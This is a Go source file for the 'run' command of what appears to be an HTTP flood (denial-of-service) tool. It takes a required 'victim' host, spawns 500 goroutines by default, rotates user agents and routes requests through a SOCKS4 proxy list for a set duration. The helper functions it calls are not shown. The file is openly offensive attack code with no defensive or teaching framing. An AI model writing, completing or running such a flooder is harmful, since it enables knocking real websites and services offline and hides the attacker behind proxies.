package main

import (
	"runtime"
	"strconv"
	"time"

	"github.com/mkideal/cli"
)

type runT struct {
	cli.Helper
	Host     string `cli:"*host" usage:"your victim"`
	Port     int    `cli:"port" dft:"80"`
	Thread   int    `cli:"thread" dft:"500"`
	Method   string `cli:"method" dft:"GET"`
	Path     string `cli:"path" dft:"/"`
	File     string `cli:"file" dft:"socks4.txt"`
	Duration int    `cli:"d" dft:"10"`
}

var runCommand = &cli.Command{
	Name: "run",
	Desc: "Some desc",
	Argv: func() interface{} {
		return new(runT)
	},
	Fn: func(ctx *cli.Context) error {
		runtime.GOMAXPROCS(runtime.NumCPU())
		argv := ctx.Argv().(*runT)
		ua := getUserAgents(500)
		port := strconv.Itoa(argv.Port)
		proxies := readLines(argv.File)
		for i := 0; i < argv.Thread; i++ {
			go prepareRequests(argv.Host, port, ua, proxies, argv.Path, argv.Method)
		}
		time.Sleep(time.Duration(argv.Duration) * time.Second)
		return nil
	},
}
